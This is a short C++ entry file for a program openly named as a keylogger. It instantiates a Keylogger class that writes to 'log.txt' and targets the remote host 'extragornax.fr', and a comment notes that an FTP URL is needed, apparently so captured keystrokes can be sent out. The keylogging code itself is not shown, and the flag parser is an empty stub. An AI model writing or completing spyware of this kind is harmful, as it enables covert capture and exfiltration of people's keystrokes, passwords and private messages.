#include <memory>
#include "keylogger.hpp"

/*
** Parse flags to structure for some applications settings
** Needed for now FTP URL
**
** Check https://www.boost.org/doc/libs/1_67_0/doc/html/program_options.html
**
*/

void parse_flags(char **av)
{
	return;
}

void run()
{
	std::unique_ptr<Keylogger> prog(new Keylogger("log.txt", "extragornax.fr"));
	return;
}

int main(int ac, char **av)
{
	if (ac != 1) {
		parse_flags(av);
	}
	run();
	return 0;
}